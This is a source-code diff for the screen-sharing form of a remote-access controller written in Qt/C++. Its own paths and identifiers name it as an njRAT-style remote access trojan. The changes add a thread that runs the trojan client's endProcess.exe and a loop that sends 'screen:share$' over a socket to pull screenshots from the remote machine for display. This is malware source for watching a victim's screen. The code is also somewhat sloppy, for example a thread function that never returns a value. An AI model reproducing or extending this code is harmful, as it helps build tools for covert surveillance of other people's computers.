@@ -1,5 +1,13 @@
 #include "screensharingform.h"
 #include "ui_screensharingform.h"
+#include <QApplication>
+#include <QFile>
+#include <QProcess>
+#include <QPushButton>
+#include <QThread>
+#include <windows.h>
+
+bool sharingPermission;
 
 ScreenSharingForm::ScreenSharingForm(QWidget *parent) :
     QWidget(parent),
@@ -23,6 +31,27 @@ ScreenSharingForm::~ScreenSharingForm()
     delete ui;
 }
 
+DWORD WINAPI threadFoo(LPVOID ptr)
+{
+    //QProcess* process = new QProcess((QObject*)ptr);
+    //QString sysCom = QString("cmd.exe /C \"start D:/endProcess.exe\"");
+    //QString sysCom = "cmd.exe /C \"" + QCoreApplication::applicationDirPath() + "/endProcess.exe\"";
+    //process->start(sysCom);
+
+    //QThread::sleep(3);
+
+    //char signalName[] = "EndScreenShareRAT";
+    //HANDLE signal = OpenEventA(EVENT_ALL_ACCESS, FALSE, signalName);
+    //char acceptSignalName[] = "EndScreenShareAccept";
+    //HANDLE acceptSignal = OpenEventA(EVENT_ALL_ACCESS, FALSE, acceptSignalName);
+
+    //WaitForSingleObject(signal, INFINITE);
+    //SetEvent(acceptSignal);
+
+    system(('\"' + QCoreApplication::applicationDirPath() + "/../njRAT_client/endProcess.exe\"").toStdString().c_str());
+    sharingPermission = false;
+}
+
 void ScreenSharingForm::get_functionalityForm(FunctionalityForm *mw, QTcpSocket *sk)
 {
     functionalityForm = mw;
@@ -32,29 +61,31 @@ void ScreenSharingForm::get_functionalityForm(FunctionalityForm *mw, QTcpSocket 
     ui->screenshotSharingLabel->clear();
     ui->screenshotSharingLabel->setText("Wait the screen share...");
 
-    // temporary
-    sendQuery();
-}
+    CreateThread(NULL, NULL, threadFoo, this, NULL, NULL);
 
-void ScreenSharingForm::on_backButton_clicked()
-{
-    sharingPermission = false;
-    functionalityForm->show();
-    this->hide();
+    sendQuery();
 }
 
 void ScreenSharingForm::sendQuery()
 {
-    if (socket->isOpen())
+    if (sharingPermission)
     {
-        socket->write(QString("screen:share$").toStdString().c_str());
-        socket->waitForBytesWritten(500);
+        if (socket->isOpen())
+        {
+            socket->write(QString("screen:share$").toStdString().c_str());
+            socket->waitForBytesWritten(50);
+        }
+        else
+        {
+            functionalityForm->show();
+            this->hide();
+            QMessageBox::critical(this, "Error!", "Loss of connection to the server!");
+        }
     }
     else
     {
         functionalityForm->show();
         this->hide();
-        QMessageBox::critical(this, "Error!", "Loss of connection to the server!");
     }
 }
 
@@ -66,6 +97,5 @@ void ScreenSharingForm::get_screenshot_for_sharing(QPixmap *screenshot)
     ui->screenshotSharingLabel->setPixmap(screenshot->scaled(w, h, Qt::KeepAspectRatio));  // Установка картинки
     ui->screenshotSharingLabel->setStyleSheet("background: none;");
 
-    // temporary
     sendQuery();
 }
